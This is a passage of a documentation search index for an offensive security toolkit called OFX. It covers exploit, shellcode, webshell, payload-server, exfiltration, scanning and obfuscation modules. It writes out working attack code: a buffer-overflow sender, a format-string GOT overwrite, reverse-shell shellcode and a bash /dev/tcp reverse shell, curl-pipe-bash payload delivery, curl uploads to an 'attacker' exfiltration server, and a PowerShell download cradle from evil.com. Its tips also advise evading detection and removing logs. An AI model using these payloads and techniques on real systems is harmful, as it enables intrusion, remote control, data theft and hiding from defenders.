nop_sled + shellcode + padding + ret_addr\n\n# Send exploit\nimport socket\ns = socket.socket()\ns.connect((\"target.com\", 9999))\ns.send(exploit)\n</code></pre>"},{"location":"api/exploitation/exploit/#format-string-exploitation","title":"Format String Exploitation","text":"<pre><code>from ofx.api.exploit import exploit_format_string\n\n# Target: overwrite GOT entry\ntarget_addr = 0x0804a018  # GOT address\ntarget_value = 0x08048484  # Our shellcode address\n\n# Generate payload\npayload = exploit_format_string.generate_write_payload(\n    address=target_addr,\n    value=target_value,\n    offset=4  # Format string offset\n)\n\n# Send payload\nimport requests\nrequests.get(f\"http://target.com/?name={payload}\")\n</code></pre>"},{"location":"api/exploitation/exploit/#see-also","title":"See Also","text":"<ul> <li>Shellcode API</li> <li>HTTP API</li> <li>Webshell API</li> </ul>"},{"location":"api/exploitation/http/","title":"HTTP Client API","text":"<p>The OFX HTTP client module provides utilities for sending HTTP requests, handling responses, and automating web interactions in workflows and Python scripts.</p>"},{"location":"api/exploitation/http/#features","title":"Features","text":"<ul> <li>Send GET, POST, PUT, DELETE, and custom HTTP requests</li> <li>Set headers, cookies, and authentication</li> <li>Handle JSON, text, and binary responses</li> <li>Integrate with OFX workflows and step outputs</li> </ul>"},{"location":"api/exploitation/http/#usage-in-python","title":"Usage in Python","text":"<pre><code>from ofx.api.http import requests\n\n# Simple GET request\nresp = requests.get(\"https://example.com\")\nprint(resp.status_code, resp.text)\n\n# POST with data\nresp = requests.post(\"https://api.example.com/login\", data={\"user\": \"admin\", \"pass\": \"secret\"})\nprint(resp.json())\n</code></pre>"},{"location":"api/exploitation/http/#usage-in-workflow-yaml","title":"Usage in Workflow YAML","text":"<pre><code>steps:\n    - name: Fetch Data\n        run: |\n            from ofx.api.http import requests\n            resp = requests.get(\"https://api.example.com/data\")\n            print(resp.text)\n        script:\n        outputs:\n            data: \"{{ step.stdout }}\"\n</code></pre>"},{"location":"api/exploitation/http/#tips","title":"Tips","text":"<ul> <li>Use <code>resp.json()</code> for JSON APIs</li> <li>Set custom headers with <code>headers={...}</code></li> <li>Handle errors with try/except in Python steps</li> </ul>"},{"location":"api/exploitation/http/#see-also","title":"See Also","text":"<ul> <li>Webshell API</li> </ul>"},{"location":"api/exploitation/shellcode/","title":"Shellcode API","text":"<p>The OFX Shellcode API module provides utilities for generating, encoding, and managing shellcode for exploitation and payload delivery.</p>"},{"location":"api/exploitation/shellcode/#features","title":"Features","text":"<ul> <li>Generate shellcode for multiple architectures (x86, x64, ARM, etc.)</li> <li>Encode shellcode to bypass filters (e.g., base64, xor)</li> <li>Integrate shellcode into exploits and workflows</li> </ul>"},{"location":"api/exploitation/shellcode/#usage-in-python","title":"Usage in Python","text":"<pre><code>from ofx.api.shellcode import OSShellcodes\n\n# Generate linux x64 reverse shell shellcode\nsc = OSShellcodes(\"linux\", \"x64\", \"10.0.0.1\", 4444)\nshellcode = sc.create_shellcode(shellcode_type=\"reverse\")\nprint(shellcode)\n\n# Encode shellcode\nencoded = sc.create_shellcode(shellcode_type=\"reverse\", encode=\"xor\", encode_key=0x42)\nprint(encoded)\n</code></pre>"},{"location":"api/exploitation/shellcode/#usage-in-workflow-yaml","title":"Usage in Workflow YAML","text":"<pre><code>steps:\n    - name: Generate Shellcode\n        script: |\n            from ofx.api.shellcode import OSShellcodes\n            sc = OSShellcodes(\"linux\", \"x64\", \"10.0.0.1\", 4444)\n            shellcode = sc.create_shellcode(shellcode_type=\"reverse\")\n            print(shellcode)\n        outputs:\n            shellcode: \"{{ step.stdout }}\"\n</code></pre>"},{"location":"api/exploitation/shellcode/#tips","title":"Tips","text":"<ul> <li>Always test shellcode in a safe environment</li> <li>Use encoding to evade basic detection</li> <li>Document the purpose and target of each shellcode</li> </ul>"},{"location":"api/exploitation/shellcode/#see-also","title":"See Also","text":"<ul> <li>Webshell API</li> </ul>"},{"location":"api/exploitation/webshell/","title":"Webshell API","text":"<p>The OFX Webshell API module provides utilities for managing, deploying, and interacting with webshells during red teaming and post-exploitation workflows.</p>"},{"location":"api/exploitation/webshell/#features","title":"Features","text":"<ul> <li>Deploy webshells to remote servers</li> <li>Connect and execute commands via webshells</li> <li>Support for multiple webshell types (PHP, ASPX, JSP, etc.)</li> <li>Integrate with OFX workflows and automation</li> </ul>"},{"location":"api/exploitation/webshell/#usage-in-python","title":"Usage in Python","text":"<pre><code>from ofx.api.webshell import WebShellClient\n\n# Connect to a deployed webshell\nclient = WebShellClient(url=\"http://target.com/shell.php\", password=\"pass\")\nresp = client.execute(\"whoami\")\nprint(resp)\n</code></pre>"},{"location":"api/exploitation/webshell/#usage-in-workflow-yaml","title":"Usage in Workflow YAML","text":"<pre><code>steps:\n    - name: Execute via Webshell\n        run: |\n            from ofx.api.webshell import WebShellClient\n            client = WebShellClient(url=\"http://target.com/shell.php\", password=\"pass\")\n            print(client.execute(\"id\"))\n        script:\n        outputs:\n            result: \"{{ step.stdout }}\"\n</code></pre>"},{"location":"api/exploitation/webshell/#tips","title":"Tips","text":"<ul> <li>Use strong, unique passwords for webshells</li> <li>Clean up webshells after use to avoid detection</li> <li>Use the API to automate post-exploitation tasks</li> </ul>"},{"location":"api/exploitation/webshell/#see-also","title":"See Also","text":"<ul> <li>Shellcode API</li> </ul>"},{"location":"api/post-exploitation/","title":"Post-Exploitation API","text":"<p>Overview of post-exploitation modules and usage.</p> <ul> <li>File Operations</li> <li>Utilities</li> <li>Workflow Integration</li> </ul>"},{"location":"api/post-exploitation/file/","title":"File Operations API","text":"<p>The OFX File Operations API provides utilities for reading, writing, uploading, and downloading files during post-exploitation and automation workflows.</p>"},{"location":"api/post-exploitation/file/#features","title":"Features","text":"<ul> <li>Read and write files on the local filesystem</li> <li>Integrate file operations into OFX workflows and Python steps</li> </ul>"},{"location":"api/post-exploitation/file/#usage-in-python","title":"Usage in Python","text":"<pre><code>from ofx.api.file import read_file, write_file\n\n# Read a file\ncontent = read_file(\"/etc/passwd\")\nprint(content)\n\n# Write a file\nwrite_file(\"loot.txt\", \"secret data\")\n</code></pre>"},{"location":"api/post-exploitation/file/#usage-in-workflow-yaml","title":"Usage in Workflow YAML","text":"<pre><code>steps:\n    - name: Read a file in a workflow\n        script: |\n            from ofx.api.file import read_file\n            content = read_file(\"local_file.txt\")\n            print(content)\n        outputs:\n            file_content: \"{{ step.stdout }}\"\n</code></pre>"},{"location":"api/post-exploitation/file/#tips","title":"Tips","text":"<ul> <li>Always check permissions before file operations</li> <li>Clean up sensitive files after use</li> <li>Use outputs to pass file contents between steps</li> </ul>"},{"location":"api/post-exploitation/file/#see-also","title":"See Also","text":"<ul> <li>Workflow Integration</li> </ul>"},{"location":"api/post-exploitation/httpserver/","title":"HTTP Server API","text":"<p>HTTP server utilities for data exfiltration and payload delivery.</p>"},{"location":"api/post-exploitation/httpserver/#module-ofxapihttpserver","title":"Module: <code>ofx.api.httpserver</code>","text":"<p>Provides HTTP server functionality for offensive operations.</p>"},{"location":"api/post-exploitation/httpserver/#classes","title":"Classes","text":""},{"location":"api/post-exploitation/httpserver/#simplehttpserver","title":"SimpleHTTPServer","text":"<p>Basic HTTP server for file serving and data collection.</p> <pre><code>from ofx.api.httpserver import SimpleHTTPServer\n\n# Start server\nserver = SimpleHTTPServer(port=8000, directory=\"/path/to/files\")\nserver.start()\n\n# Server running at http://0.0.0.0:8000\n# Serves files from directory\n</code></pre> <p>Parameters: - <code>port</code> (int): Server port (default: 8000) - <code>directory</code> (str): Directory to serve (default: current directory) - <code>host</code> (str): Bind address (default: 0.0.0.0) - <code>allow_upload</code> (bool): Enable file uploads (default: False)</p> <p>Methods: - <code>start()</code> - Start server (non-blocking) - <code>stop()</code> - Stop server - <code>get_logs()</code> - Get access logs</p>"},{"location":"api/post-exploitation/httpserver/#payloadserver","title":"PayloadServer","text":"<p>HTTP server for payload delivery with logging.</p> <pre><code>from ofx.api.httpserver import PayloadServer\n\n# Setup payload server\nserver = PayloadServer(port=8080)\n\n# Add payloads\nserver.add_payload(\"/shell.sh\", content=shell_script)\nserver.add_payload(\"/exploit.py\", file=\"/path/to/exploit.py\")\n\n# Start serving\nserver.start()\n\n# Track downloads\nhits = server.get_hits(\"/shell.sh\")\n</code></pre> <p>Methods: - <code>add_payload(path, content=None, file=None)</code> - Add payload - <code>remove_payload(path)</code> - Remove payload - <code>get_hits(path)</code> - Get download count - <code>start()</code> - Start server - <code>stop()</code> - Stop server</p>"},{"location":"api/post-exploitation/httpserver/#exfilserver","title":"ExfilServer","text":"<p>HTTP server for data exfiltration.</p> <pre><code>from ofx.api.httpserver import ExfilServer\n\n# Start exfil server\nserver = ExfilServer(port=9000, save_dir=\"/exfil/data\")\nserver.start()\n\n# On target, send data:\n# curl -X POST http://attacker:9000/upload \\\n#   -F \"file=@sensitive.txt\"\n\n# Retrieve exfiltrated data\nfiles = server.get_files()\n</code></pre> <p>Parameters: - <code>port</code> (int): Server port - <code>save_dir</code> (str): Directory to save received files - <code>auto_timestamp</code> (bool): Add timestamps to filenames</p> <p>Methods: - <code>get_files()</code> - List received files - <code>get_file_content(filename)</code> - Read file content - <code>clear_files()</code> - Delete all files</p>"},{"location":"api/post-exploitation/httpserver/#functions","title":"Functions","text":""},{"location":"api/post-exploitation/httpserver/#start_server","title":"start_server","text":"<p>Quick server creation.</p> <pre><code>from ofx.api.httpserver import start_server\n\n# Serve current directory\nserver = start_server(port=8000)\n\n# With uploads enabled  \nserver = start_server(port=8000, allow_upload=True)\n\n# Custom directory\nserver = start_server(port=8080, directory=\"/payloads\")\n</code></pre>"},{"location":"api/post-exploitation/httpserver/#create_oneliner","title":"create_oneliner","text":"<p>Generate one-liner download commands.</p> <pre><code>from ofx.api.httpserver import create_oneliner\n\n# Generate curl command\ncmd = create_oneliner(\n    url=\"http://192.168.1.100:8000/shell.sh\",\n    method=\"curl\"\n)\n# Returns: \"curl -s http://192.168.1.100:8000/shell.sh | bash\"\n\n# wget version\ncmd = create_oneliner(url=url, method=\"wget\")\n\n# PowerShell version\ncmd = create_oneliner(url=url, method=\"powershell\")\n</code></pre>"},{"location":"api/post-exploitation/httpserver/#examples","title":"Examples","text":""},{"location":"api/post-exploitation/httpserver/#payload-delivery","title":"Payload Delivery","text":"<pre><code>from ofx.api.httpserver import PayloadServer\n\n# Setup server\nserver = PayloadServer(port=8080)\n\n# Add reverse shell payload\nreverse_shell = '''#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.10.1/4444 0&gt;&amp;1\n'''\nserver.add_payload(\"/shell.sh\", content=reverse_shell)\n\n# Start server\nserver.start()\nprint(\"Payload available at: http://0.0.0.0:8080/shell.sh\")\n\n# On target: \n# curl http://attacker:8080/shell.sh | bash\n</code></pre>"},{"location":"api/post-exploitation/httpserver/#data-exfiltration","title":"Data Exfiltration","text":"<pre><code>from ofx.api.httpserver import ExfilServer\nimport time\n\n# Start exfil server\nserver = ExfilServer(port=9000, save_dir=\"/tmp/exfil\")\nserver.start()\n\nprint(\"Exfil server running on port 9000\")\nprint(\"Send data with:\")\nprint(\"  curl -F file=@data.txt http://attacker:9000/upload\")\n\n# Wait for files\ntime.sleep(300)\n\n# Check received files\nfiles = server.get_files()\nfor f in files:\n    content = server.get_file_content(f)\n    print(f\"Received {f}: {len(content)} bytes\")\n</code></pre>"},{"location":"api/post-exploitation/httpserver/#file-server-with-logging","title":"File Server with Logging","text":"<pre><code>from ofx.api.httpserver import SimpleHTTPServer\n\n# Serve payloads directory\nserver = SimpleHTTPServer(\n    port=8000,\n    directory=\"/opt/payloads\",\n    allow_upload=False\n)\n\nserver.start()\n\n# Monitor access\nwhile True:\n    logs = server.get_logs()\n    for log in logs:\n        print(f\"{log['timestamp']}: {log['ip']} accessed {log['path']}\")\n    time.sleep(10)\n</code></pre>"},{"location":"api/post-exploitation/httpserver/#security-considerations","title":"Security Considerations","text":"<ul> <li>Bind to specific interface in production</li> <li>Use authentication for sensitive operations</li> <li>Enable HTTPS for credential transmission</li> <li>Rate limit to prevent abuse</li> <li>Log all access for monitoring</li> </ul>"},{"location":"api/post-exploitation/httpserver/#see-also","title":"See Also","text":"<ul> <li>HTTP API</li> <li>File API</li> <li>Post-Exploitation Overview</li> </ul>"},{"location":"api/post-exploitation/network/","title":"Network API","text":"<p>Network utilities for port scanning, service detection, and network reconnaissance.</p>"},{"location":"api/post-exploitation/network/#module-ofxapinetwork","title":"Module: <code>ofx.api.network</code>","text":"<p>Provides network utilities for offensive security operations.</p>"},{"location":"api/post-exploitation/network/#functions","title":"Functions","text":""},{"location":"api/post-exploitation/network/#port_scan","title":"port_scan","text":"<p>Perform port scanning on target hosts.</p> <pre><code>from ofx.api.network import port_scan\n\n# Scan common ports\nresults = port_scan(\"192.168.1.1\", ports=[80, 443, 22, 21])\n\n# Scan port range\nresults = port_scan(\"example.com\", port_range=(1, 1024))\n\n# Parallel scanning\nresults = port_scan(\n    targets=[\"192.168.1.1\", \"192.168.1.2\"],\n    ports=[80, 443],\n    threads=10\n)\n</code></pre> <p>Parameters: - <code>target</code> (str | list): Target IP or hostname(s) - <code>ports</code> (list[int], optional): Specific ports to scan - <code>port_range</code> (tuple, optional): Port range (start, end) - <code>threads</code> (int): Number of threads (default: 10) - <code>timeout</code> (float): Connection timeout (default: 1.0)</p> <p>Returns: <code>dict</code> - Scan results with open ports</p>"},{"location":"api/post-exploitation/network/#service_detect","title":"service_detect","text":"<p>Detect services running on open ports.</p> <pre><code>from ofx.api.network import service_detect\n\n# Detect services\nservices = service_detect(\"192.168.1.1\", ports=[80, 443, 22])\n\n# Output:\n# {\n#   80: {\"service\": \"http\", \"version\": \"Apache/2.4.41\"},\n#   443: {\"service\": \"https\", \"version\": \"nginx/1.18.0\"},\n#   22: {\"service\": \"ssh\", \"version\": \"OpenSSH_8.2\"}\n# }\n</code></pre> <p>Parameters: - <code>target</code> (str): Target IP or hostname - <code>ports</code> (list[int]): Ports to probe - <code>timeout</code> (float): Probe timeout</p> <p>Returns: <code>dict</code> - Service information per port</p>"},{"location":"api/post-exploitation/network/#resolve_hostname","title":"resolve_hostname","text":"<p>Resolve hostname to IP addresses.</p> <pre><code>from ofx.api.network import resolve_hostname\n\n# Resolve DNS\nips = resolve_hostname(\"example.com\")\n# Returns: [\"93.184.216.34\"]\n\n# Get all records\nrecords = resolve_hostname(\"example.com\", record_type=\"ALL\")\n</code></pre> <p>Parameters: - <code>hostname</code> (str): Hostname to resolve - <code>record_type</code> (str): DNS record type (default: \"A\")</p> <p>Returns: <code>list[str]</code> - IP addresses</p>"},{"location":"api/post-exploitation/network/#reverse_lookup","title":"reverse_lookup","text":"<p>Perform reverse DNS lookup.</p> <pre><code>from ofx.api.network import reverse_lookup\n\n# Reverse lookup\nhostname = reverse_lookup(\"93.184.216.34\")\n# Returns: \"example.com\"\n</code></pre> <p>Parameters: - <code>ip</code> (str): IP address</p> <p>Returns: <code>str</code> - Hostname</p>"},{"location":"api/post-exploitation/network/#classes","title":"Classes","text":""},{"location":"api/post-exploitation/network/#networkscanner","title":"NetworkScanner","text":"<p>Advanced network scanner with multiple techniques.</p> <pre><code>from ofx.api.network import NetworkScanner\n\nscanner = NetworkScanner()\n\n# SYN scan (requires root)\nresults = scanner.syn_scan(\"192.168.1.1\", ports=[80, 443])\n\n# TCP connect scan\nresults = scanner.tcp_scan(\"192.168.1.1\", ports=[22, 80, 443])\n\n# UDP scan\nresults = scanner.udp_scan(\"192.168.1.1\", ports=[53, 161])\n</code></pre> <p>Methods: - <code>syn_scan()</code> - TCP SYN scan (stealth) - <code>tcp_scan()</code> - TCP connect scan - <code>udp_scan()</code> - UDP scan - <code>banner_grab()</code> - Grab service banners</p>"},{"location":"api/post-exploitation/network/#examples","title":"Examples","text":""},{"location":"api/post-exploitation/network/#port-scan-with-service-detection","title":"Port Scan with Service Detection","text":"<pre><code>from ofx.api.network import port_scan, service_detect\n\n# Scan ports\nopen_ports = port_scan(\"example.com\", port_range=(1, 1000))\n\n# Detect services on open ports\nservices = service_detect(\"example.com\", ports=open_ports)\n\nfor port, info in services.items():\n    print(f\"Port {port}: {info['service']} {info.get('version', '')}\")\n</code></pre>"},{"location":"api/post-exploitation/network/#network-range-scan","title":"Network Range Scan","text":"<pre><code>from ofx.api.network import NetworkScanner\nfrom ipaddress import IPv4Network\n\nscanner = NetworkScanner()\n\n# Scan subnet\nnetwork = IPv4Network(\"192.168.1.0/24\")\nfor ip in network.hosts():\n    results = scanner.tcp_scan(str(ip), ports=[80, 443])\n    if results:\n        print(f\"{ip}: {results}\")\n</code></pre>"},{"location":"api/post-exploitation/network/#see-also","title":"See Also","text":"<ul> <li>HTTP API</li> <li>Reconnaissance</li> </ul>"},{"location":"api/post-exploitation/strings/","title":"String Utilities","text":"<p>String manipulation and encoding utilities for payload crafting.</p>"},{"location":"api/post-exploitation/strings/#module-ofxapistrings","title":"Module: <code>ofx.api.strings</code>","text":"<p>Provides string manipulation functions for offensive security operations.</p>"},{"location":"api/post-exploitation/strings/#functions","title":"Functions","text":""},{"location":"api/post-exploitation/strings/#encode_string","title":"encode_string","text":"<p>Encode strings in various formats.</p> <pre><code>from ofx.api.strings import encode_string\n\n# Base64\nencoded = encode_string(\"payload\", encoding=\"base64\")\n# Returns: \"cGF5bG9hZA==\"\n\n# URL encoding\nencoded = encode_string(\"param=value&amp;test\", encoding=\"url\")\n# Returns: \"param%3Dvalue%26test\"\n\n# Hex encoding\nencoded = encode_string(\"shell\", encoding=\"hex\")\n# Returns: \"7368656c6c\"\n\n# HTML entities\nencoded = encode_string(\"&lt;script&gt;\", encoding=\"html\")\n# Returns: \"&amp;lt;script&amp;gt;\"\n</code></pre> <p>Parameters: - <code>text</code> (str): String to encode - <code>encoding</code> (str): Encoding type</p> <p>Supported Encodings: - <code>base64</code> - Base64 encoding - <code>url</code> - URL encoding - <code>hex</code> - Hexadecimal - <code>html</code> - HTML entities - <code>unicode</code> - Unicode escapes - <code>rot13</code> - ROT13 cipher</p>"},{"location":"api/post-exploitation/strings/#decode_string","title":"decode_string","text":"<p>Decode encoded strings.</p> <pre><code>from ofx.api.strings import decode_string\n\n# Base64\ndecoded = decode_string(\"cGF5bG9hZA==\", encoding=\"base64\")\n# Returns: \"payload\"\n\n# URL decoding\ndecoded = decode_string(\"param%3Dvalue\", encoding=\"url\")\n\n# Hex decoding\ndecoded = decode_string(\"7368656c6c\", encoding=\"hex\")\n</code></pre>"},{"location":"api/post-exploitation/strings/#obfuscate","title":"obfuscate","text":"<p>Obfuscate strings for evasion.</p> <pre><code>from ofx.api.strings import obfuscate\n\n# PowerShell obfuscation\nobfuscated = obfuscate(\n    \"Get-Process\",\n    method=\"powershell\"\n)\n\n# Bash obfuscation\nobfuscated = obfuscate(\n    \"cat /etc/passwd\",\n    method=\"bash\"\n)\n\n# String concatenation\nobfuscated = obfuscate(\n    \"malicious\",\n    method=\"concat\"\n)\n# Returns: \"mal\"+\"ici\"+\"ous\"\n</code></pre> <p>Methods: - <code>powershell</code> - PowerShell string obfuscation - <code>bash</code> - Bash variable expansion - <code>concat</code> - String concatenation - <code>reverse</code> - Reverse and unreverse - <code>charcode</code> - Character code conversion</p>"},{"location":"api/post-exploitation/strings/#generate_random","title":"generate_random","text":"<p>Generate random strings.</p> <pre><code>from ofx.api.strings import generate_random\n\n# Random alphanumeric\nrandom_str = generate_random(length=16)\n\n# Random hex\nhex_str = generate_random(length=32, charset=\"hex\")\n\n# Custom charset\ncustom = generate_random(length=10, charset=\"ABC123\")\n</code></pre> <p>Parameters: - <code>length</code> (int): String length - <code>charset</code> (str): Character set (<code>alphanumeric</code>, <code>hex</code>, <code>alpha</code>, custom)</p>"},{"location":"api/post-exploitation/strings/#escape_quotes","title":"escape_quotes","text":"<p>Escape quotes in strings.</p> <pre><code>from ofx.api.strings import escape_quotes\n\n# Escape single quotes\nescaped = escape_quotes(\"It's working\", quote=\"'\")\n# Returns: \"It\\\\'s working\"\n\n# Escape  double quotes\nescaped = escape_quotes('Say \"Hello\"', quote='\"')\n# Returns: 'Say \\\\\"Hello\\\\\"'\n</code></pre>"},{"location":"api/post-exploitation/strings/#examples","title":"Examples","text":""},{"location":"api/post-exploitation/strings/#payload-encoding","title":"Payload Encoding","text":"<pre><code>from ofx.api.strings import encode_string\n\n# XSS payload\nxss = \"&lt;script&gt;alert(1)&lt;/script&gt;\"\n\n# HTML entity encoding\nencoded = encode_string(xss, encoding=\"html\")\n# Use in HTML context\n\n# URL encoding for parameter\nurl_safe = encode_string(xss, encoding=\"url\")\n# Use in URL parameter\n</code></pre>"},{"location":"api/post-exploitation/strings/#command-obfuscation","title":"Command Obfuscation","text":"<pre><code>from ofx.api.strings import obfuscate\n\n# Original command\ncmd = \"whoami\"\n\n# Obfuscate for bash\nobfuscated = obfuscate(cmd, method=\"bash\")\n# Might generate: w\\h\\o\\a\\m\\i or $(echo d2hvYW1p|base64 -d)\n\n# Use in payload\npayload = f\"system('{obfuscated}')\"\n</code></pre>"},{"location":"api/post-exploitation/strings/#sqli-payload-crafting","title":"SQLi Payload Crafting","text":"<pre><code>from ofx.api.strings import encode_string, obfuscate\n\n# SQL injection payload\nsqli = \"' OR '1'='1\"\n\n# Hex encoding\nhex_payload = encode_string(sqli, encoding=\"hex\")\n\n# Use in  SQL context\npayload = f\"0x{hex_payload}\"\n</code></pre>"},{"location":"api/post-exploitation/strings/#powershell-evasion","title":"PowerShell Evasion","text":"<pre><code>from ofx.api.strings import obfuscate, encode_string\n\n# PowerShell download cradle\nps_cmd = \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')\"\n\n# Base64 encode\nb64 = encode_string(ps_cmd, encoding=\"base64\")\n\n# Obfuscate\nobfuscated = obfuscate(ps_cmd, method=\"powershell\")\n\n# Execute\nexec_cmd = f\"powershell -enc {b64}\"\n</code></pre>"},{"location":"api/post-exploitation/strings/#use-in-workflows","title":"Use in Workflows","text":"<pre><code>name: payload-encoding\njobs:\n  encode:\n    steps:\n      - name: Encode payload\n        run: |\n          python3 &lt;&lt; 'EOF'\n          from ofx.api.strings import encode_string\n\n          payload = \"${{ inputs.payload }}\"\n          encoded = encode_string(payload, encoding=\"base64\")\n          print(f\"::set-output encoded={encoded}\")\n          EOF\n</code></pre>"},{"location":"api/post-exploitation/strings/#see-also","title":"See Also","text":"<ul> <li>Exploitation API</li> <li>HTTP API</li> <li>Shellcode API</li> </ul>"},{"location":"api/post-exploitation/utils/","title":"Utilities API","text":"<p>The OFX Utilities API provides helper functions for encoding, decoding, hashing, and other common post-exploitation tasks.</p>"},{"location":"api/post-exploitation/utils/#features","title":"Features","text":"<ul> <li>Encode/decode data (base64, hex, etc.)</li> <li>Hash data (MD5, SHA1, SHA256, etc.)</li> <li>Convert formats and manipulate strings</li> </ul>"},{"location":"api/post-exploitation/utils/#usage-in-python","title":"Usage in Python","text":"<pre><code>from ofx.api.utils import encode, decode, hash_data\n\n# Encode to base64\nb64 = encode(\"secret\", method=\"base64\")\nprint(b64)\n\n# Hash a string\ndigest = hash_data(\"password\", method=\"sha256\")\nprint(digest)\n</code></pre>"},{"location":"api/post-exploitation/utils/#usage-in-workflow-yaml","title":"Usage in Workflow YAML","text":"<pre><code>steps:\n    - name: Encode Data\n        run: |\n            from ofx.api.utils import encode\n            print(encode(\"loot\", method=\"base64\"))\n        script:\n        outputs:\n            encoded: \"{{ step.stdout }}\"\n</code></pre>"},{"location":"api/post-exploitation/utils/#tips","title":"Tips","text":"<ul> <li>Use encoding to safely transfer data between steps</li> <li>Hash sensitive data before storage or transmission</li> </ul>"},{"location":"api/post-exploitation/utils/#see-also","title":"See Also","text":"<ul> <li>File Operations</li> </ul>"},{"location":"api/post-exploitation/workflow/","title":"Workflow Integration API","text":"<p>Integrate post-exploitation tasks into your OFX workflows for automated data collection, persistence, and cleanup after exploitation.</p>"},{"location":"api/post-exploitation/workflow/#example-post-exploitation-workflow","title":"Example: Post-Exploitation Workflow","text":"<pre><code>jobs:\n    exploit:\n        steps:\n            - run: python exploit.py\n    post:\n        needs: exploit\n        steps:\n            - run: python collect_loot.py\n            - run: ./persistence.sh\n            - run: ./cleanup.sh\n</code></pre>"},{"location":"api/post-exploitation/workflow/#common-post-exploitation-tasks","title":"Common Post-Exploitation Tasks","text":"<ul> <li>Data exfiltration</li> <li>Credential dumping</li> <li>Persistence setup</li> <li>Cleanup and log removal</li> </ul>"},{"location":"api/post-exploitation/workflow/#tips","title":"Tips","text":"<ul> <li>Chain post-exploitation jobs after successful exploitation</li> <li>Use outputs to pass data between jobs</li> <li>Automate cleanup to reduce detection risk</li> </ul>"},{"location":"api/post-exploitation/workflow/#see-also","title":"See Also","text":"<ul> <li>File Operations</li> <li>Utilities</li> </ul>"},{"location":"api/reconnaissance/","title":"Reconnaissance API","text":"<p>Overview of reconnaissance modules and usage.</p> <ul> <li>FOFA</li> <li>Shodan</li> <li>ZoomEye</li> </ul>"},{"location":"api/reconnaissance/fofa/","title":"FOFA API","text":"<p>FOFA (https://fofa.info) is a powerful search engine for internet-connected assets. The OFX FOFA client automates authentication, credential management, and asset searching for red teaming and reconnaissance workflows.</p>"},{"location":"api/reconnaissance/fofa/#features","title":"Features","text":"<ul> <li>Automated credential management (config file or prompt)</li> <li>Search with FOFA dorks and retrieve results as URLs</li> <li>Supports pagination and custom resource types</li> <li>Integrates with OFX YAML workflows and Python scripts</li> </ul>"},{"location":"api/reconnaissance/fofa/#setup","title":"Setup","text":"<p>You need a FOFA account and API key. The client will prompt for these on first use, or you can provide them in a config file:</p> <p>Config file location: <code>~/.local/share/ofx/config.ini</code></p> <pre><code>[Fofa]\nUser = your@email.com\nToken = your_fofa_api_key\n</code></pre>"},{"location":"api/reconnaissance/fofa/#usage-in-python","title":"Usage in Python","text":"<pre><code>from ofx.api.search.fofa import Fofa\n\n# Initialize (will prompt for credentials if not found)\nfofa = Fofa()\n\n# Search for assets with a FOFA dork\nresults = fofa.search('title=\"login\" &amp;&amp; country=\"US\"', pages=2)\nfor url in results:\n        print(url)\n</code></pre> <p>Parameters: - <code>dork</code> (str): FOFA query string (e.g., <code>port=8080 &amp;&amp; protocol=\"http\"</code>) - <code>pages</code> (int): Number of result pages to fetch (default: 1) - <code>resource</code> (str): 'host' for IP:port, or 'domain' for hostnames (default: 'host')</p>"},{"location":"api/reconnaissance/fofa/#usage-in-ofx-yaml-workflow","title":"Usage in OFX YAML Workflow","text":"<p>You can use the FOFA API in a workflow step:</p> <pre><code>name: FOFA Recon Example\njobs:\n    fofa_search:\n                steps:\n                    - name: Search FOFA\n                        script: |\n                            from ofx.api.search.fofa import Fofa\n                            fofa = Fofa()\n                            results = fofa.search('app=\"Apache\" &amp;&amp; country=\"CN\"', pages=1)\n                            for url in results:\n                                print(url)\n                        outputs:\n                            targets: \"{{ step.stdout_lines }}\"\n</code></pre>"},{"location":"api/reconnaissance/fofa/#example-queries","title":"Example Queries","text":"<ul> <li><code>title=\"admin\" &amp;&amp; country=\"US\"</code> \u2014 Find admin panels in the US</li> <li><code>app=\"Apache\" &amp;&amp; port=80</code> \u2014 Apache servers on port 80</li> <li><code>protocol=\"https\" &amp;&amp; cert.subject.CN=\"*.gov\"</code> \u2014 HTTPS .gov domains</li> </ul>"},{"location":"api/reconnaissance/fofa/#tips","title":"Tips","text":"<ul> <li>FOFA dorks use a rich query language; see FOFA Docs for syntax</li> <li>Always respect FOFA's API rate limits and your account's search credits</li> <li>Results are returned as a set of URLs (e.g., <code>https://1.2.3.4:443</code>)</li> <li>IPv6 addresses are wrapped in brackets (e.g., <code>https://[2606:4700:4700::1111]:443</code>)</li> </ul>"},{"location":"api/reconnaissance/fofa/#error-handling","title":"Error Handling","text":"<ul> <li>If credentials are invalid, you will be prompted to re-enter them</li> <li>API errors and rate limits are logged to the console</li> </ul>"},{"location":"api/reconnaissance/fofa/#see-also","title":"See Also","text":"<ul> <li>Shodan API</li> <li>ZoomEye API</li> </ul>"},{"location":"api/reconnaissance/oob/","title":"Out-of-Band (OOB) Testing","text":"<p>Out-of-band interaction detection for blind vulnerability testing.</p>"},{"location":"api/reconnaissance/oob/#module-ofxapioob","title":"Module: <code>ofx.api.oob</code>","text":"<p>Provides OOB interaction platforms for detecting blind vulnerabilities like SSRF, XXE, and command injection.</p>"},{"location":"api/reconnaissance/oob/#platforms","title":"Platforms","text":""},{"location":"api/reconnaissance/oob/#interactsh","title":"Interactsh","text":"<p>Open-source OOB interaction platform.</p> <pre><code>from ofx.api.oob import Interactsh\n\n# Initialize client\nclient = Interactsh()\n\n# Get unique URL\nurl = client.get_url()\n# Returns: \"https://cxxxxxxx.interact.sh\"\n\n# Use URL in payload\npayload = f\"curl {url}/callback\"\n\n# Check for interactions\ninteractions = client.poll()\nfor interaction in interactions:\n    print(f\"Protocol: {interaction['protocol']}\")\n    print(f\"Request: {interaction['raw-request']}\")\n</code></pre> <p>Methods: - <code>get_url()</code> - Get unique OOB URL - <code>poll()</code> - Check for interactions - <code>get_all_interactions()</code> - Get all interactions - <code>close()</code> - Cleanup</p>"},{"location":"api/reconnaissance/oob/#ceye","title":"Ceye","text":"<p>Ceye.io OOB platform (requires API key).</p> <pre><code>from ofx.api.oob import Ceye\n\n# Initialize with API key\nclient = Ceye(api_key=\"your-api-key\")\n\n# Get identifier\nidentifier = client.get_identifier()\ndomain = f\"{identifier}.ceye.io\"\n\n# Use in payload\npayload = f\"ping -c 1 {domain}\"\n\n# Check for DNS queries\ninteractions = client.check_dns()\nif interactions:\n    print(\"Vulnerable! Received DNS query\")\n\n# Check for HTTP requests\nhttp_logs = client.check_http()\n</code></pre> <p>Methods: - <code>get_identifier()</code> - Get unique identifier - <code>check_dns()</code> - Check DNS queries - <code>check_http()</code> - Check HTTP requests - <code>check_all()</code> - Check all interaction 